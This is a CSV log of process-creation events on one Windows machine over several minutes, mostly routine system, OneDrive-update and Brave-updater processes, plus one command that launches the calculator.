Timestamp,DeviceName,AccountName,FileName,ProcessCommandLine,InitiatingProcessFileName,InitiatingProcessCommandLine,RemoteIP
"Sep 16, 2025 2:43:48 PM",slflarewinsysmo,slflare,TSTheme.exe,TSTheme.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:43:48 PM",slflarewinsysmo,slflare,rdpclip.exe,rdpclip,svchost.exe,svchost.exe -k NetworkService,159.26.106.84
"Sep 16, 2025 2:43:49 PM",slflarewinsysmo,slflare,sihost.exe,sihost.exe,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:43:50 PM",slflarewinsysmo,slflare,svchost.exe,svchost.exe -k UnistackSvcGroup,services.exe,services.exe,159.26.106.84
"Sep 16, 2025 2:43:51 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /c calc.exe",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:43:51 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe USER,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:43:51 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:43:51 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:43:52 PM",slflarewinsysmo,slflare,ctfmon.exe,ctfmon.exe,svchost.exe,svchost.exe -k LocalSystemNetworkRestricted -p,159.26.106.84
"Sep 16, 2025 2:43:54 PM",slflarewinsysmo,slflare,userinit.exe,userinit.exe,winlogon.exe,winlogon.exe,159.26.106.84
"Sep 16, 2025 2:43:55 PM",slflarewinsysmo,slflare,explorer.exe,Explorer.EXE,userinit.exe,userinit.exe,159.26.106.84
"Sep 16, 2025 2:44:00 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /c calc.exe",159.26.106.84
"Sep 16, 2025 2:44:10 PM",slflarewinsysmo,slflare,svchost.exe,svchost.exe -k ClipboardSvcGroup -p,services.exe,services.exe,159.26.106.84
"Sep 16, 2025 2:44:11 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:12 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:14 PM",slflarewinsysmo,slflare,StartMenuExperienceHost.exe,"""StartMenuExperienceHost.exe"" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:17 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:21 PM",slflarewinsysmo,slflare,SearchApp.exe,"""SearchApp.exe"" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:21 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe SyncFromCloud,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:24 PM",slflarewinsysmo,slflare,wlrmdr.exe, -c -s 0 -f 0 -t Empty -m Empty -a 0 -u Empty,winlogon.exe,winlogon.exe,159.26.106.84
"Sep 16, 2025 2:44:24 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:28 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:34 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXe9cvj1thv1hmcw0cs98xm3r97tyzy2xs.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:37 PM",slflarewinsysmo,slflare,ClipESUConsumer.exe,"""ClipESUConsumer.exe"" -evaluateEligibility",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:37 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:ShellFeedsUI.AppXnj65k2d1a1rnztt2t2nng5ctmk3e76pn.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:37 PM",slflarewinsysmo,slflare,calc.exe,calc.exe,cmd.exe,"""cmd.exe"" /c calc.exe",159.26.106.84
"Sep 16, 2025 2:44:37 PM",slflarewinsysmo,slflare,ClipESUConsumer.exe,"""ClipESUConsumer.exe"" -processRefund",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXapskvk16gk8da8kch5g4qxh42vxccved.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,OneDriveStandaloneUpdater.exe,"""OneDriveStandaloneUpdater.exe"" /reporting",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,OneDriveStandaloneUpdater.exe,OneDriveStandaloneUpdater.exe,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /c",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource scheduler",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:38 PM",slflarewinsysmo,slflare,rundll32.exe,"""rundll32.exe"" C:\Windows\system32\PcaSvc.dll,PcaWallpaperAppDetect",svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:39 PM",slflarewinsysmo,slflare,HxTsr.exe,"""HxTsr.exe"" -ServerName:Hx.IPC.Server",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:41 PM",slflarewinsysmo,slflare,mobsync.exe,mobsync.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:46 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{722D0F89-B69C-4700-AE8C-4A44350E4876},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:47 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:48 PM",slflarewinsysmo,slflare,smartscreen.exe,smartscreen.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:51 PM",slflarewinsysmo,slflare,SecurityHealthSystray.exe,SecurityHealthSystray.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 2:44:52 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:44:52 PM",slflarewinsysmo,slflare,OneDrive.exe,"""OneDrive.exe"" /background",explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 2:44:54 PM",slflarewinsysmo,slflare,BraveUpdateCore.exe,BraveUpdateCore.exe,explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 2:44:55 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /q /c del /q ""C:\Users\SLFlare\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""",explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 2:44:55 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /q /c del /q ""C:\Users\SLFlare\AppData\Local\Microsoft\OneDrive\Update\OneDriveSetup.exe""",159.26.106.84
"Sep 16, 2025 2:44:56 PM",slflarewinsysmo,slflare,cmd.exe,"""cmd.exe"" /q /c del /q ""C:\Users\SLFlare\AppData\Local\Microsoft\OneDrive\StandaloneUpdater\OneDriveSetup.exe""",explorer.exe,Explorer.EXE,159.26.106.84
"Sep 16, 2025 2:44:56 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe $(Arg0),svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:44:57 PM",slflarewinsysmo,slflare,conhost.exe,conhost.exe 0xffffffff -ForceV1,cmd.exe,"""cmd.exe"" /q /c del /q ""C:\Users\SLFlare\AppData\Local\Microsoft\OneDrive\StandaloneUpdater\OneDriveSetup.exe""",159.26.106.84
"Sep 16, 2025 2:45:00 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /c",braveupdatecore.exe,BraveUpdateCore.exe,159.26.106.84
"Sep 16, 2025 2:45:07 PM",slflarewinsysmo,slflare,FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:45:08 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:45:10 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:45:15 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /cr",braveupdate.exe,"""BraveUpdate.exe"" /c",159.26.106.84
"Sep 16, 2025 2:45:21 PM",slflarewinsysmo,slflare,BraveCrashHandler.exe,BraveCrashHandler.exe,braveupdate.exe,"""BraveUpdate.exe"" /c",159.26.106.84
"Sep 16, 2025 2:45:21 PM",slflarewinsysmo,slflare,SearchApp.exe,"""SearchApp.exe"" -ServerName:CortanaUI.AppX8z9r6jm96hw4bsbneegw0kyxx296wr9t.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:45:31 PM",slflarewinsysmo,slflare,BraveCrashHandler64.exe,BraveCrashHandler64.exe,braveupdate.exe,"""BraveUpdate.exe"" /c",159.26.106.84
"Sep 16, 2025 2:45:36 PM",slflarewinsysmo,slflare,OneDriveSetup.exe,"""OneDriveSetup.exe"" /update /restart /updateSource:ODU ",onedrive.exe,"""OneDrive.exe"" /background",159.26.106.84
"Sep 16, 2025 2:45:41 PM",slflarewinsysmo,slflare,MusNotificationUx.exe,MusNotificationUx.exe ClearActiveNotifications,musnotification.exe,"""MusNotification.exe"" LogonUpdateResults",159.26.106.84
"Sep 16, 2025 2:45:41 PM",slflarewinsysmo,slflare,OneDriveSetup.exe,OneDriveSetup.exe /update /restart /updateSource:ODU  /peruser  /childprocess  /extractFilesWithLessThreadCount  /renameReplaceOneDriveExe  /renameReplaceODSUExe  /removeNonCurrentVersions  /enableODSUReportingMode  /installWebView2  /SetPerProcessSystemDPIForceOffKey /EnableNucleusAutoStartFix /RegisterOneDriveLauncherAutoStartTask /EnableOneDriveLauncherRampDownloads /ReLaunchOD4AppHarness,onedrivesetup.exe,"""OneDriveSetup.exe"" /update /restart /updateSource:ODU ",159.26.106.84
"Sep 16, 2025 2:45:43 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" /ua /installsource core",braveupdate.exe,"""BraveUpdate.exe"" /c",159.26.106.84
"Sep 16, 2025 2:45:46 PM",slflarewinsysmo,slflare,ApplicationFrameHost.exe,ApplicationFrameHost.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:45:47 PM",slflarewinsysmo,slflare,CalculatorApp.exe,CalculatorApp.exe,sihost.exe,sihost.exe,159.26.106.84
"Sep 16, 2025 2:45:51 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:45:53 PM",slflarewinsysmo,slflare,BraveUpdate.exe,"""BraveUpdate.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:46:01 PM",slflarewinsysmo,slflare,OneDrive.Sync.Service.exe,"""OneDrive.Sync.Service.exe"" /silentConfig",onedrivestandaloneupdater.exe,OneDriveStandaloneUpdater.exe,159.26.106.84
"Sep 16, 2025 2:46:07 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:46:25 PM",slflarewinsysmo,slflare,dllhost.exe,DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:46:42 PM",slflarewinsysmo,slflare,FileSyncConfig.exe,FileSyncConfig.exe,onedrivesetup.exe,OneDriveSetup.exe /update /restart /updateSource:ODU  /peruser  /childprocess  /extractFilesWithLessThreadCount  /renameReplaceOneDriveExe  /renameReplaceODSUExe  /removeNonCurrentVersions  /enableODSUReportingMode  /installWebView2  /SetPerProcessSystemDPIForceOffKey /EnableNucleusAutoStartFix /RegisterOneDriveLauncherAutoStartTask /EnableOneDriveLauncherRampDownloads /ReLaunchOD4AppHarness,159.26.106.84
"Sep 16, 2025 2:46:49 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""BackgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:46:50 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:46:51 PM",slflarewinsysmo,slflare,svchost.exe,svchost.exe -k DevicesFlow,services.exe,services.exe,159.26.106.84
"Sep 16, 2025 2:46:54 PM",slflarewinsysmo,slflare,OneDrive.exe,updateInstalled /background,onedrivesetup.exe,OneDriveSetup.exe /update /restart /updateSource:ODU  /peruser  /childprocess  /extractFilesWithLessThreadCount  /renameReplaceOneDriveExe  /renameReplaceODSUExe  /removeNonCurrentVersions  /enableODSUReportingMode  /installWebView2  /SetPerProcessSystemDPIForceOffKey /EnableNucleusAutoStartFix /RegisterOneDriveLauncherAutoStartTask /EnableOneDriveLauncherRampDownloads /ReLaunchOD4AppHarness,159.26.106.84
"Sep 16, 2025 2:47:02 PM",slflarewinsysmo,slflare,FileCoAuth.exe,"""FileCoAuth.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:47:04 PM",slflarewinsysmo,slflare,OneDrive.Sync.Service.exe,silentConfig,onedrivesetup.exe,OneDriveSetup.exe /update /restart /updateSource:ODU  /peruser  /childprocess  /extractFilesWithLessThreadCount  /renameReplaceOneDriveExe  /renameReplaceODSUExe  /removeNonCurrentVersions  /enableODSUReportingMode  /installWebView2  /SetPerProcessSystemDPIForceOffKey /EnableNucleusAutoStartFix /RegisterOneDriveLauncherAutoStartTask /EnableOneDriveLauncherRampDownloads /ReLaunchOD4AppHarness,159.26.106.84
"Sep 16, 2025 2:47:16 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:47:44 PM",slflarewinsysmo,slflare,PhoneExperienceHost.exe,"""PhoneExperienceHost.exe"" -ComServer:Background -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:51 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXe9cvj1thv1hmcw0cs98xm3r97tyzy2xs.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:51 PM",slflarewinsysmo,slflare,HxTsr.exe,"""HxTsr.exe"" -ServerName:Hx.IPC.Server",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:51 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXapskvk16gk8da8kch5g4qxh42vxccved.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:51 PM",slflarewinsysmo,slflare,taskhostw.exe,taskhostw.exe Logon,svchost.exe,svchost.exe -k netsvcs -p,159.26.106.84
"Sep 16, 2025 2:48:54 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXapskvk16gk8da8kch5g4qxh42vxccved.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:59 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:59 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:WindowsBackup.AppXnn6fnh4raxtmg45ba8k2f4ykb7n0k3y4.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:59 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:Global.RulesEngine.AppXgphnekvm0vv49drvfehh4b6kyf6ckafp.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:59 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXpybpk6fj2fe0gb0jan49e6dncngk3pa1.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:48:59 PM",slflarewinsysmo,slflare,RuntimeBroker.exe,RuntimeBroker.exe -Embedding,svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:49:01 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:49:03 PM",slflarewinsysmo,slflare,backgroundTaskHost.exe,"""backgroundTaskHost.exe"" -ServerName:ShellFeedsUI.AppXnj65k2d1a1rnztt2t2nng5ctmk3e76pn.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:49:16 PM",slflarewinsysmo,slflare,BackgroundTransferHost.exe,"""BackgroundTransferHost.exe"" -ServerName:BackgroundTransferHost.1",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:49:21 PM",slflarewinsysmo,slflare,WindowsPackageManagerServer.exe,"""WindowsPackageManagerServer.exe"" -Embedding",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:51:34 PM",slflarewinsysmo,slflare,SearchApp.exe,"""SearchApp.exe"" -ServerName:ShellFeedsUI.AppX88fpyyrd21w8wqe62wzsjh5agex7tf1e.mca",svchost.exe,svchost.exe -k DcomLaunch -p,159.26.106.84
"Sep 16, 2025 2:51:37 PM",slflarewinsysmo,slflare,msedgewebview2.exe,"""msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --enable-features=msEmbeddedBrowserVisualHosting --lang=en-US --mojo-named-platform-channel-pipe=2220.6380.10211842261493070152",searchapp.exe,"""SearchApp.exe"" -ServerName:ShellFeedsUI.AppX88fpyyrd21w8wqe62wzsjh5agex7tf1e.mca",159.26.106.84
"Sep 16, 2025 2:51:37 PM",slflarewinsysmo,slflare,msedgewebview2.exe,"""msedgewebview2.exe"" --type=crashpad-handler --user-data-dir=C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView /prefetch:4 --monitor-self-annotation=ptype=crashpad-handler --database=C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView\Crashpad --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=140.0.7339.81 ""--annotation=exe=C:\Program Files (x86)\Microsoft\EdgeWebView\Application\140.0.3485.54\msedgewebview2.exe"" --annotation=plat=Win64 ""--annotation=prod=Edge WebView2"" --annotation=ver=140.0.3485.54 --initial-client-data=0x170,0x174,0x178,0x14c,0x180,0x7ffe25ea2200,0x7ffe25ea220c,0x7ffe25ea2218",msedgewebview2.exe,"""msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --enable-features=msEmbeddedBrowserVisualHosting --lang=en-US --mojo-named-platform-channel-pipe=2220.6380.10211842261493070152",159.26.106.84
"Sep 16, 2025 2:51:43 PM",slflarewinsysmo,slflare,msedgewebview2.exe,"""msedgewebview2.exe"" --type=gpu-process --noerrdialogs --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --embedded-browser-webview=1 --no-pre-read-main-dll --gpu-preferences=SAAAAAAAAADgAAAIAAAAAAAAAAAAAGAAAQAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --startup-read-main-dll --metrics-shmem-handle=1652,i,3213264125427321835,6777430984109362258,262144 --field-trial-handle=1912,i,3704950018702456231,6645339648170424040,262144 --enable-features=ForceSWDCompWhenDCompFallbackRequired,msAggressiveCacheTrimming,msCustomDataPartition,msEmbeddedBrowserVisualHosting,msWebView2NoTabForScreenShare,msWebViewAppLifeCycleWorkaround --disable-features=BackForwardCache,BackgroundTabLoadingFromPerformanceManager,CloseOmniboxPopupOnInactiveAreaClick,CollectAVProductsInfo,CollectCodeIntegrityInfo,EnableHangWatcher,FilterAdsOnAbusiveSites,GetWifiProtocol,LoginDetection,MediaFoundationCameraUsageMonitoring,PreconnectToSearch,SafetyHub,SegmentationPlatform,SpareRendererForSitePerProcess,Ukm,WebPayments,msAITrackerClassification,msAbydosForWindowlessWV2,msAffirmVirtualCard,msAllowChromeWebstore,msAllowMSAPrtSSOForNonMSAProfile,msApplicationGuard,msAskBeforeClosingMultipleTabs,msAutoToggleAADPrtSSOForNonAADProfile,msAutofillEdgeCoupons,msAutofillEdgeCouponsAutoApply,msAutofillEdgeServiceRequest,msAutofillEnableEdgeSuggestions,msAutomaticTabFreeze,msBrowserSettingsSupported,msCoarseGeolocationService,msDataProtection,msDesktopMode,msDesktopRewards,msDisableVariationsSeedFetchThrottling,msEEProactiveHistory,msETFOffstoreExtensionFileDataCollection,msETFPasswordTheftDNRActionSignals,msEdgeAdPlatformUI,msEdgeAddWebCapturetoCollections,msEdgeAutofillShowDeployedPassword,msEdgeCaptureSelectionInPDF,msEdgeCloudConfigService,msEdgeCloudConfigServiceV2,msEdgeCohorts,msEdgeCollectionsPrismExperiment1,msEdgeCollectionsPrismOverallMigration,msEdgeComposeNext,msEdgeEnableNurturingFramework,msEdgeEnclavePrefsBasic,msEdgeEnclavePrefsNotification,msEdgeFaviconService,msEdgeHJTelemetry,msEdgeHubAppSkype,msEdgeImageEditorUI,msEdgeLinkDoctor,msEdgeMouseGestureDefaultEnabled,msEdgeMouseGestureSupported,msEdgeNewDeviceFre,msEdgeOnRampFRE,msEdgeOnRampImport,msEdgePDFCMHighlightUX,msEdgePasswordIris,msEdgePasswordIrisSaveBubble,msEdgeProngPersonalization,msEdgeReadingView,msEdgeRose,msEdgeScreenshotUI,msEdgeSendTabToSelf,msEdgeSettingsImport,msEdgeSettingsImportV2,msEdgeShoppingPersistentStorage,msEdgeShoppingUI,msEdgeSmartFind,msEdgeSuperDragDefaultEnabled,msEdgeSuperDragDropSupported,msEdgeTranslate,msEdgeUpdatesMoreMenuPill,msEdgeWebCapture,msEdgeWebCaptureUniformExperience,msEdgeWebContentFilteringFeedback,msEdgeWorkSearchBanner,msEnableCustomJobMemoryLimitsOnXbox,msEnableMIPForPDF,msEnablePdfUpsell,msEnableThirdPartyScanning,msEnableWebSignInCta,msEnableWebToBrowserSignIn,msEndpointDlp,msEntityExtraction,msExtensionTelemetryFramework,msExternalTaskManager,msFileSystemAccessDirectoryIterationBlocklistCheck,msForceBrowserSignIn,msForeignSessionsPage,msGeolocationAccessService,msGeolocationOSLocationPermissionFallback,msGeolocationSQMService,msGeolocationService,msGrowthInfraLaunchSourceLogging,msGuidedSwitchAllowed,msHubPinPersist,msImplicitSignin,msIrm,msIrmv2,msKlarnaVirtualCard,msLlmConsumerDlpPurview,msLoadStatistics,msLogIsEdgePinnedToTaskbarOnLaunch,msMIPCrossTenantPdfViewSupport,msMdatpWebSiteDlp,msNotificationPermissionForPWA,msNumberOfSitesToPin,msNurturingGlobalSitePinningOnCloseModal,msNurturingSitePinningCITopSites,msNurturingSitePinningWithWindowsConsent,msOnHoverSearchInSidebar,msOpenOfficeDocumentsInWebViewer,msPageInteractionRestrictionRevoke,msPasswordBreachDetection,msPdfAnnotationsVisibility,msPdfDataRecovery,msPdfDigitalSignatureRead,msPdfFreeText,msPdfFreeTextForCJK,msPdfHighlightMode,msPdfInking,msPdfKeyphraseSupport,msPdfOOUI,msPdfPopupMarkerRenderer,msPdfShare,msPdfSharedLibrary,msPdfTextNote,msPdfTextNoteMoreMenu,msPdfThumbnailCache,msPdfUnderside,msPdfViewRestore,msPersonalizationUMA,msPriceComparison,msPrintInWebView2,msPromptDefaultHandlerForPDF,msReactiveSearch,msReadAloud,msReadAloudPdf,msRedirectToShoreline,msRevokeExtensions,msSaasDlp,msShoppingTrigger,msShorelineSearch,msShorelineSearchFindOnPageWebUI,msShowOfflineGameEntrance,msShowReadAloudIconInAddressBar,msShowUXForAADPrtSSOForNonAADProfile,msSitePinningWithoutUi,msSuspendMessageForNewSessionWhenHavingPendingNavigation,msSyncEdgeCollections,msTabResourceStats,msTokenizationAutofillInlineEnabled,msTouchMode,msTriggeringSignalGenerator,msUserUnderstanding,msVideoSuperResolutionUI,msWalletBuyNow,msWalletCheckout,msWalletDiagnosticDataLogger,msWalletHubEntry,msWalletHubIntlP3,msWalletPartialCard,msWalletPasswordCategorization,msWalletPasswordCategorizationPlatformExpansion,msWalletTokenizationCardMetadata,msWalletTokenizedAutofill,msWebAssist,msWebAssistHistorySearchService,msWebOOUI,msWindowsTaskManager,msWindowsUserActivities,msZipPayVirtualCard --variations-seed-version --mojo-platform-channel-handle=1908 /prefetch:2",msedgewebview2.exe,"""msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=SearchApp.exe --webview-exe-version=10.0.19041.6282 --user-data-dir=""C:\Users\SLFlare\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView"" --noerrdialogs --enable-features=msEmbeddedBrowserVisualHosting --lang=en-US --mojo-named-platform-channel-pipe=2220.6380.10211842261493070152",159.26.106.84
